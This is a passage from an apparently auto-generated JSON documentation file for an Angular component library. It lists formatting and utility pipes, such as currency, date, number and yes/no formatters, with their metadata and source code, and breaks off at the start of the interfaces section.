{
    "pipes": [
        {
            "name": "ActivePreferencePipe",
            "id": "pipe-ActivePreferencePipe-e9ff2f12240a61f5a0bfa06d6d8d63dd",
            "file": "libs/common/src/lib/preference-manager/active-preference.pipe.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "preferences",
                            "type": "Preference[]"
                        },
                        {
                            "name": "activePreferenceId",
                            "type": "string | null"
                        }
                    ],
                    "optional": false,
                    "returnType": "Preference | null",
                    "typeParameters": [],
                    "line": 9,
                    "jsdoctags": [
                        {
                            "name": "preferences",
                            "type": "Preference[]",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "activePreferenceId",
                            "type": "string | null",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "activePreference",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Preference } from './preference';\n\n@Pipe({\n  name: 'activePreference'\n})\nexport class ActivePreferencePipe implements PipeTransform {\n\n  transform(preferences: Preference[], activePreferenceId: string | null): Preference | null {\n    let active: Preference | undefined;\n    if ( !preferences ) {\n      return null;\n    }\n    if ( activePreferenceId ) {\n      active = preferences.find(p => p.id === activePreferenceId);\n    }\n    return active ?? null;\n  }\n\n}\n"
        },
        {
            "name": "ColumnStylePipe",
            "id": "pipe-ColumnStylePipe-c68571662da3caa3e048a34dce191b7c",
            "file": "libs/datatable/src/lib/sto-datatable/column-style.pipe.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "column",
                            "type": "Column"
                        },
                        {
                            "name": "displayMode",
                            "type": "ColumnDisplay"
                        },
                        {
                            "name": "width",
                            "type": "number | null",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "literal type",
                    "typeParameters": [],
                    "line": 9,
                    "jsdoctags": [
                        {
                            "name": "column",
                            "type": "Column",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "displayMode",
                            "type": "ColumnDisplay",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "width",
                            "type": "number | null",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "columnStyle",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Column, ColumnDisplay } from './columns';\n\n@Pipe({\n  name: 'columnStyle'\n})\nexport class ColumnStylePipe implements PipeTransform {\n\n  transform(column: Column, displayMode: ColumnDisplay, width?: number | null): {[klass: string]: unknown;} {\n    switch ( displayMode ) {\n      case ColumnDisplay.Force:\n        return {\n          'width.px': width || ( column.flexBasis || 80 ),\n          'maxWidth.px': width || ( column.flexBasis || 80 ),\n          float: 'left'\n        };\n      case ColumnDisplay.Flex:\n      default:\n        return {\n          flexGrow: ( column.flexGrow || column.flexGrow === 0 ) ? column.flexGrow : 1,\n          flexShrink: ( column.flexShrink || column.flexShrink === 0 ) ? column.flexShrink : 1,\n          'flexBasis.px': width || ( column.flexBasis || 80 ),\n        };\n    }\n  }\n\n}\n\n/*         [style.flex-grow]=\"(column.flexGrow || column.flexGrow === 0) ? column.flexGrow : 1\"\n         [style.flex-shrink]=\"(column.flexShrink || column.flexShrink === 0) ? column.flexShrink : 1\"\n         [style.flex-basis.px]=\"headerWidthMap[i] || (column.flexBasis || 80)\"*/\n"
        },
        {
            "name": "CurrencyFormatPipe",
            "id": "pipe-CurrencyFormatPipe-a79211bc5c16d16ebf85f719a5b327be",
            "file": "libs/core/src/lib/sto-pipes/currency-format.pipe.ts",
            "type": "pipe",
            "description": "<p>Pipe used to transform numbers to a currency format</p>\n",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "number"
                        },
                        {
                            "name": "unit",
                            "type": "string",
                            "defaultValue": "''"
                        },
                        {
                            "name": "maximumFractionDigits",
                            "type": "number",
                            "defaultValue": "3"
                        }
                    ],
                    "optional": false,
                    "returnType": "string | null",
                    "typeParameters": [],
                    "line": 16,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "unit",
                            "type": "string",
                            "defaultValue": "''",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "maximumFractionDigits",
                            "type": "number",
                            "defaultValue": "3",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "currencyFormat",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n  * Pipe used to transform numbers to a currency format\n  *\n  * @example\n  *\n  * <span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\n  * Results in\n  * <span>5 000,582 $</span>\n  */\n@Pipe({\n  name: 'currencyFormat'\n})\nexport class CurrencyFormatPipe implements PipeTransform {\n  transform(value: number, unit: string = '', maximumFractionDigits = 3): string | null {\n    if (!value) {\n      return null;\n    }\n    if (typeof value === 'string') {\n      value = parseFloat(value);\n      if (isNaN(value)) {\n        return '';\n      }\n    }\n\n    const intl = new Intl.NumberFormat('en-US', {maximumFractionDigits}).format(value);\n    return intl.replace(/,/g, ' ').replace('.', ',') + ` ${unit}`;\n  }\n}\n\n",
            "jsdoctags": [
                {
                    "pos": 122,
                    "end": 133,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 122,
                        "end": 123,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 123,
                        "end": 130,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "<span>{{ 5000.5824 | currentFormat:'$':3 }}</span>\nResults in\n<span>5 000,582 $</span>"
                }
            ]
        },
        {
            "name": "DateFormatPipe",
            "id": "pipe-DateFormatPipe-fafcef1a18ec16e3d7b88f34b496d36f",
            "file": "libs/core/src/lib/sto-pipes/date-format.pipe.ts",
            "type": "pipe",
            "description": "<p>Pipe used to transform dates, based on our default formats.</p>\n",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "string | number | Date | null"
                        },
                        {
                            "name": "format",
                            "type": "string",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "string | null",
                    "typeParameters": [],
                    "line": 19,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string | number | Date | null",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "format",
                            "type": "string",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "formatDate",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { format as formatDate } from 'date-fns';\n\n/**\n * Pipe used to transform dates, based on our default formats.\n *\n * @example\n *\n * public date = \"2018-08-27 14:00:30\"\n * <span>{{ date | dateFormat }}</span> -> Aug 27, 2018\n * <span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018\n */\n\n@Pipe({\n  name: 'formatDate'\n})\nexport class DateFormatPipe implements PipeTransform {\n\n  transform(value: string | number | Date | null, format?: string): string | null {\n    if (!value) {\n      return null;\n    }\n    if (typeof value === 'string') {\n      value = new Date(value);\n    }\n    switch (format) {\n      case 'long':\n        return formatDate(value, 'EEEE MMM d, yyyy');\n      case 'short':\n        return formatDate(value, 'yyyy-MM-dd');\n      case 'datetime':\n        return formatDate(value, 'MMM d, yyyy, HH:mm');\n      case 'datetimezone':\n        return formatDate(value, `MMM d, yyyy, HH:mm:ss ('UTC'xxx)`);\n      case 'datetime-long':\n        return formatDate(value, 'EEEE MMM dd, yyyy, HH:mm');\n      case 'datetime-short':\n        return formatDate(value, 'yyyy-MM-dd, HH:mm');\n      default:\n        return formatDate(value, 'MMM d, yyyy');\n    }\n  }\n\n}\n",
            "jsdoctags": [
                {
                    "pos": 176,
                    "end": 186,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 176,
                        "end": 177,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 177,
                        "end": 184,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "public date = \"2018-08-27 14:00:30\"\n<span>{{ date | dateFormat }}</span> -> Aug 27, 2018\n<span>{{ date | dateFormat:'long' }}</span> -> Monday Aug 27, 2018"
                }
            ]
        },
        {
            "name": "ExcludeUnit",
            "id": "pipe-ExcludeUnit-77a069b5b206754b2a2392daed08972f",
            "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "string"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 22,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "excludeUnit",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n@Pipe({name: 'getUnit'})\nexport class GetUnit implements PipeTransform {\n  transform(value: string, withParens?: boolean): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0 ) {\n        if (withParens) {\n          value = '(' + arr[1];\n        } else {\n          arr[1].slice(0, -1);\n          value = arr[1].slice(0, -1);\n        }\n      }\n    }\n    return value;\n  }\n}\n@Pipe({name: 'excludeUnit'})\nexport class ExcludeUnit implements PipeTransform {\n  transform(value: string): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0) {\n        value = arr[0];\n      }\n    }\n    return value;\n  }\n}\n"
        },
        {
            "name": "ExecPipe",
            "id": "pipe-ExecPipe-e64db5e6421fa0938f3952206ef5f647",
            "file": "libs/datatable/src/lib/sto-datatable/exec.pipe.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "func",
                            "type": " | R"
                        },
                        {
                            "name": "value",
                            "type": "unknown",
                            "optional": true
                        },
                        {
                            "name": "column",
                            "type": "Column",
                            "optional": true
                        },
                        {
                            "name": "row",
                            "type": "T",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "R | null",
                    "typeParameters": [],
                    "line": 10,
                    "jsdoctags": [
                        {
                            "name": "func",
                            "type": " | R",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "value",
                            "type": "unknown",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "column",
                            "type": "Column",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "row",
                            "type": "T",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "exec",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\nimport { Column } from './columns';\n\n@Pipe({\n  name: 'exec'\n})\n// eslint-disable-next-line @typescript-eslint/no-explicit-any\nexport class ExecPipe<T = unknown, R = any> implements PipeTransform/*, Exec<T>*/ {\n\n  transform(func: ( (...args: unknown[]) => R ) | R, value?: unknown, column?: Column, row?: T): R | null {\n    if ( func && typeof func === 'function' ) {\n      return ( func as (...args: unknown[]) => R )(value, row, column);\n    } else if ( typeof func === 'string' ) {\n      return func;\n    }\n    return null;\n  }\n\n}\n"
        },
        {
            "name": "GetUnit",
            "id": "pipe-GetUnit-77a069b5b206754b2a2392daed08972f",
            "file": "libs/core/src/lib/sto-pipes/with-unit.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "string"
                        },
                        {
                            "name": "withParens",
                            "type": "boolean",
                            "optional": true
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 5,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "withParens",
                            "type": "boolean",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "getUnit",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n@Pipe({name: 'getUnit'})\nexport class GetUnit implements PipeTransform {\n  transform(value: string, withParens?: boolean): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0 ) {\n        if (withParens) {\n          value = '(' + arr[1];\n        } else {\n          arr[1].slice(0, -1);\n          value = arr[1].slice(0, -1);\n        }\n      }\n    }\n    return value;\n  }\n}\n@Pipe({name: 'excludeUnit'})\nexport class ExcludeUnit implements PipeTransform {\n  transform(value: string): string {\n    if (value) {\n      const arr = value.split('(');\n      if (arr.length > 0) {\n        value = arr[0];\n      }\n    }\n    return value;\n  }\n}\n"
        },
        {
            "name": "KeysPipe",
            "id": "pipe-KeysPipe-92fc848b59effa77ebe84bf1cc1b9f6c",
            "file": "libs/core/src/lib/sto-pipes/keys.pipe.ts",
            "type": "pipe",
            "description": "<p>Transforms an Object to an Array.</p>\n",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "Record<string | unknown>"
                        }
                    ],
                    "optional": false,
                    "returnType": "Array<string>",
                    "typeParameters": [],
                    "line": 17,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "Record<string | unknown>",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "keys",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n * Transforms an Object to an Array.\n *\n * @example\n *\n * public obj = {a: 1, b: 2, c: 3};\n * <span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,\n */\n\n@Pipe({\n  name: 'keys'\n})\nexport class KeysPipe implements PipeTransform {\n\n  transform(value: Record<string, unknown>): Array<string> {\n    if (value) {\n      return Object.keys(value);\n    }\n    return [];\n  }\n\n}\n",
            "jsdoctags": [
                {
                    "pos": 101,
                    "end": 111,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 101,
                        "end": 102,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 102,
                        "end": 109,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "public obj = {a: 1, b: 2, c: 3};\n<span *ngFor=\"let key of obj | keys \"> {{ obj[key] }}, </span> -> 1, 2, 3,"
                }
            ]
        },
        {
            "name": "NumberFormatPipe",
            "id": "pipe-NumberFormatPipe-b4fbd040a27c47ca81ead927aefde704",
            "file": "libs/core/src/lib/sto-pipes/number-format.pipe.ts",
            "type": "pipe",
            "description": "<p>Formats numbers to use our standard formatting (d ddd,ddd)</p>\n",
            "properties": [],
            "methods": [
                {
                    "name": "prettyPrintValue",
                    "args": [
                        {
                            "name": "value",
                            "type": "number"
                        },
                        {
                            "name": "appendDecimals",
                            "type": "boolean"
                        },
                        {
                            "name": "numberOfDecimals",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 53,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "appendDecimals",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "numberOfDecimals",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "toFixed",
                    "args": [
                        {
                            "name": "num",
                            "type": "number"
                        },
                        {
                            "name": "precision",
                            "type": "number"
                        }
                    ],
                    "optional": false,
                    "returnType": "any",
                    "typeParameters": [],
                    "line": 68,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "num",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "precision",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "number | string"
                        },
                        {
                            "name": "unit",
                            "type": "string",
                            "defaultValue": "''"
                        },
                        {
                            "name": "abs",
                            "type": "boolean",
                            "optional": true
                        },
                        {
                            "name": "appendDecimals",
                            "type": "",
                            "defaultValue": "true"
                        },
                        {
                            "name": "numberOfDecimals",
                            "type": "number",
                            "defaultValue": "3"
                        }
                    ],
                    "optional": false,
                    "returnType": "string | null",
                    "typeParameters": [],
                    "line": 19,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "number | string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "unit",
                            "type": "string",
                            "defaultValue": "''",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "abs",
                            "type": "boolean",
                            "optional": true,
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "appendDecimals",
                            "type": "",
                            "defaultValue": "true",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "numberOfDecimals",
                            "type": "number",
                            "defaultValue": "3",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "numberFormat",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\n/**\n * Formats numbers to use our standard formatting (d ddd,ddd)\n *\n * @example\n *\n * {{ 1234,32 | numberFormat }} -> 1 234,320\n * {{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\n * {{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\n * {{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\n * {{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3\n */\n@Pipe({\n  name: 'numberFormat'\n})\nexport class NumberFormatPipe implements PipeTransform {\n\n  transform(value: number | string, unit: string = '', abs?: boolean, appendDecimals = true, numberOfDecimals = 3): string | null {\n    if ( value !== 0 && !value ) {\n      return '';\n    }\n    if ( typeof value === 'string' ) {\n      const newValue = parseFloat(value);\n      if ( isNaN(newValue) ) {\n        return null;\n      }\n      value = newValue;\n    }\n    if ( abs ) {\n      value = Math.abs(value);\n    }\n    // We absolute the value to ensure that the rounding rules is always away from zero.\n    // 1.5 => 2 and -1.5 => -2\n    const isNegativeNumber = value < 0;\n    value = Math.abs(value);\n\n    if ( !appendDecimals ) {\n      value = Math.round(value);\n    }\n    if ( !isNaN(value) && appendDecimals ) {\n      value = parseFloat(this.toFixed(value, numberOfDecimals));\n    }\n    // Turn negative numbers back, but only if value is not -0\n    // eslint-disable-next-line no-compare-neg-zero\n    if ( isNegativeNumber && value !== -0 ) {\n      value = value * -1;\n    }\n    const localized = this.prettyPrintValue(value, appendDecimals, numberOfDecimals);\n    return localized.replace(/,/g, ' ').replace('.', ',') + `${unit ? ' ' + unit : ''}`;\n  }\n\n  private prettyPrintValue(value: number, appendDecimals: boolean, numberOfDecimals: number) {\n    const intlOptions = { minimumFractionDigits: numberOfDecimals, maximumFractionDigits: numberOfDecimals };\n    const intl = new Intl.NumberFormat('en-US', intlOptions).format(value);\n    const split = intl.split('.');\n    let localized = split[ 0 ];\n\n    if ( appendDecimals ) {\n      const decimals = split.length === 2 ? split[ 1 ] : '';\n      split[ 1 ] = decimals.padEnd(numberOfDecimals, '0');\n      localized = split.join('.');\n    }\n    return localized;\n  }\n\n  // Normal toFixed has some issues: https://stackoverflow.com/questions/10015027/javascript-tofixed-not-rounding\n  private toFixed(num: number, precision: number) {\n    // This method also has some issues - namely, it's unable to parse negative numbers with huge floating points\n    // -8.185452315956354e-12 becomes NaN\n    let returnValue = ( +( Math.round(+( num + 'e' + precision )) + 'e' + -precision ) );\n    if ( isNaN(returnValue) ) {\n      returnValue = parseFloat(num.toFixed(precision));\n    }\n    return returnValue.toFixed(precision);\n  }\n}\n",
            "jsdoctags": [
                {
                    "pos": 126,
                    "end": 136,
                    "flags": 0,
                    "kind": 288,
                    "atToken": {
                        "pos": 126,
                        "end": 127,
                        "flags": 0,
                        "kind": 57
                    },
                    "tagName": {
                        "pos": 127,
                        "end": 134,
                        "flags": 0,
                        "escapedText": "example"
                    },
                    "comment": "{{ 1234,32 | numberFormat }} -> 1 234,320\n{{ 1234,32 | numberFormat:'M3' }} -> 1 234,320 M3\n{{ -1234,32 | numberFormat:'M3':true }} -> 1 234,320 M3\n{{ 1234,32 | numberFormat:'M3':false:false }} -> 1 234 M3\n{{ 1234,32 | numberFormat:'M3':false:true:5 }} -> 1 234,32000 M3"
                }
            ]
        },
        {
            "name": "NumberInputPipe",
            "id": "pipe-NumberInputPipe-f9a53bd93c41145feb6012fa0b2ab286",
            "file": "libs/form/src/lib/number-input/number-input.pipe.ts",
            "type": "pipe",
            "description": "",
            "properties": [
                {
                    "name": "DECIMAL_SEPARATOR",
                    "defaultValue": "','",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 8,
                    "modifierKind": [
                        112
                    ]
                },
                {
                    "name": "THOUSANDS_SEPARATOR",
                    "defaultValue": "' '",
                    "type": "string",
                    "optional": false,
                    "description": "",
                    "line": 9,
                    "modifierKind": [
                        112
                    ]
                }
            ],
            "methods": [
                {
                    "name": "handleIntegerAndFractions",
                    "args": [
                        {
                            "name": "integer",
                            "type": "string"
                        },
                        {
                            "name": "fraction",
                            "type": "string"
                        },
                        {
                            "name": "fractionSize",
                            "type": "number"
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false"
                        }
                    ],
                    "optional": false,
                    "returnType": "{ integer: string; fraction: string; }",
                    "typeParameters": [],
                    "line": 11,
                    "modifierKind": [
                        112
                    ],
                    "jsdoctags": [
                        {
                            "name": "integer",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "fraction",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "fractionSize",
                            "type": "number",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "parse",
                    "args": [
                        {
                            "name": "value",
                            "type": "string"
                        },
                        {
                            "name": "fractionSize",
                            "type": "number",
                            "defaultValue": "5"
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 73,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "fractionSize",
                            "type": "number",
                            "defaultValue": "5",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                },
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "number | string"
                        },
                        {
                            "name": "fractionSize",
                            "type": "number",
                            "defaultValue": "5"
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 43,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "number | string",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "fractionSize",
                            "type": "number",
                            "defaultValue": "5",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "dynamicFractionSize",
                            "type": "",
                            "defaultValue": "false",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "numberInput",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n\nconst PADDING = '000000000';\n\n@Pipe({ name: 'numberInput' })\nexport class NumberInputPipe implements PipeTransform {\n\n  private DECIMAL_SEPARATOR = ',';\n  private THOUSANDS_SEPARATOR = ' ';\n\n  private handleIntegerAndFractions(integer: string, fraction: string, fractionSize: number, dynamicFractionSize = false) {\n    const negative = integer.startsWith('-');\n    if ( ( integer === '' && fraction === '' ) || integer === 'NaN' ) {\n      return { integer: null, fraction: null };\n    } else if ( integer === '' ) {\n      integer = '0';\n    } else if ( integer.includes('-') ) {\n      if ( integer === '-' ) {\n        integer = '-0';\n      } else {\n        integer = '-' + parseInt(integer, 10) * -1; // To handle -0.123\n      }\n    } else {\n      integer = parseInt(integer, 10) + '';\n    }\n\n    if ( fraction.length > fractionSize && !dynamicFractionSize ) {\n      const number = parseFloat('0.' + fraction);\n      const exp = Math.pow(10, fractionSize);\n      const rounded = Math.round(number * exp) / exp;\n      if ( rounded === 1 ) {\n        const addValue = negative ? -1 : 1;\n        integer = ( parseInt(integer || '0', 10) + addValue ) + '';\n        fraction = '';\n      } else {\n        fraction = ( rounded + '' ).split('.')[ 1 ] || '';\n      }\n    }\n\n    return { integer, fraction };\n  }\n\n  transform(value: number | string, fractionSize: number = 5, dynamicFractionSize = false): string {\n    if ( !value && value !== 0 ) {\n      return '';\n    }\n    value = value + '';\n    // eslint-disable-next-line\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\n    value = value.replace(re, '');\n\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\n    const [ integerSplit, fractionSplit = '' ] = value.split(this.DECIMAL_SEPARATOR);\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\n    if ( integer === null ) {\n      return '';\n    }\n    if ( dynamicFractionSize ) {\n      fraction = fraction ? this.DECIMAL_SEPARATOR + ( fraction ) : '';\n    } else {\n      fraction = fractionSize > 0\n        ? this.DECIMAL_SEPARATOR + ( fraction + PADDING ).substring(0, fractionSize)\n        : '';\n    }\n\n    integer = integer.replace(/\\B(?=(\\d{3})+(?!\\d))/g, this.THOUSANDS_SEPARATOR);\n\n\n    return integer + fraction;\n  }\n\n\n  parse(value: string, fractionSize: number = 5, dynamicFractionSize = false): string {\n    value = value + '';\n    // eslint-disable-next-line\n    const re = /[\\^¨~`´_:;!\"#¤%&/()=@£$€{\\[]/g;\n    value = value.replace(re, '');\n    value = value.replace('.', this.DECIMAL_SEPARATOR);\n    // eslint-disable-next-line prefer-const\n    let [ integerSplit, fractionSplit = '' ] = ( value || '' ).split(this.DECIMAL_SEPARATOR);\n\n    integerSplit = integerSplit.replace(new RegExp(this.THOUSANDS_SEPARATOR, 'g'), '');\n    // eslint-disable-next-line prefer-const\n    let { integer, fraction } = this.handleIntegerAndFractions(integerSplit, fractionSplit, fractionSize, dynamicFractionSize);\n\n    if ( dynamicFractionSize ) {\n      fraction = fraction ? `.${fraction}` : '';\n    } else {\n      fraction = fractionSize > 0\n        ? '.' + ( fraction + PADDING ).substring(0, fractionSize)\n        : '';\n    }\n\n\n    if ( !integer ) {\n      return '';\n    }\n    return integer + fraction;\n  }\n\n}\n"
        },
        {
            "name": "YesNoPipe",
            "id": "pipe-YesNoPipe-c83bc98593295875e9df207708baa58e",
            "file": "libs/core/src/lib/sto-pipes/yes-no.ts",
            "type": "pipe",
            "description": "",
            "properties": [],
            "methods": [
                {
                    "name": "transform",
                    "args": [
                        {
                            "name": "value",
                            "type": "boolean"
                        },
                        {
                            "name": "ignoreNulls",
                            "type": "",
                            "defaultValue": "false"
                        }
                    ],
                    "optional": false,
                    "returnType": "string",
                    "typeParameters": [],
                    "line": 4,
                    "jsdoctags": [
                        {
                            "name": "value",
                            "type": "boolean",
                            "tagName": {
                                "text": "param"
                            }
                        },
                        {
                            "name": "ignoreNulls",
                            "type": "",
                            "defaultValue": "false",
                            "tagName": {
                                "text": "param"
                            }
                        }
                    ]
                }
            ],
            "ngname": "yesNo",
            "sourceCode": "import { Pipe, PipeTransform } from '@angular/core';\n@Pipe({name: 'yesNo'})\nexport class YesNoPipe implements PipeTransform {\n  transform(value: boolean, ignoreNulls = false): string {\n    let valueStr = '';\n    if (ignoreNulls) {\n      valueStr = value ? 'Yes' : value === false ? 'No' : '';\n    } else {\n      valueStr = value ? 'Yes' : 'No';\n    }\n    return valueStr;\n\n  }\n}\n"
        }
    ],
    "interfaces": [
        {
            "name": "Activate",
            "id": "interface-Activate-b1081c105e790e2ebf637d6f7680b8ab",
            "file": "libs/datatable/src/lib/sto-datatable/events.ts",
            "type": "interface",
            "sourceCode": "import { Column } from './columns';\n\nexport interface ContextMenu {\n  event: MouseEvent | KeyboardEvent;\n  column: Column;\n}\n\ninterface RowCtx<T extends Record<string, unknown>> {\n  row: T;\n  index: number;\n}\n\nexport type RowContextMenu<T extends Record<string, unknown>> = ContextMenu & RowCtx<T>;\nexport type HeaderContextMenu = ContextMenu;\n\ninterface Activate<T extends Record<string, unknown>> {\n  row: T;\n  event: MouseEvent | KeyboardEvent;\n  index: number;\n  rowEl?: HTMLDivElement;\n}\n\nexport interface RowSelection<T extends Record<string, unknown>> extends Activate<T> {\n  event: MouseEvent | KeyboardEvent;\n}\n\nexport interface RowActivation<T extends Record<string, unknown>> extends Activate<T> {\n  event: KeyboardEvent;\n}\n",
            "properties": [
                {
                    "name": "event",
                    "type": "MouseEvent | KeyboardEvent",
                    "optional": false,
                    "description": "",
                    "line": 18
                },
                {
                    "name": "index",
                    "type": "number",
                    "optional": false,
                    "description": "",
                    "line": 19
                },
                {
                    "name": "row",
                    "type": "T",
                    "optional": false,
                    "description": "",
                    "line": 17
                },
                {
                    "name": "rowEl",
                    "type": "HTMLDivElement",
                    "optional": true,
                    "description": "",
                    "line": 20
                }
            ],
            "indexSignatures": [],
            "kind": 150,
            "methods": []
        },
        {
            "name": "Breadcrumb",
            "id": "interface-Breadcrumb-3ecfdc0e9b2e66a118b38fb7589645e0",
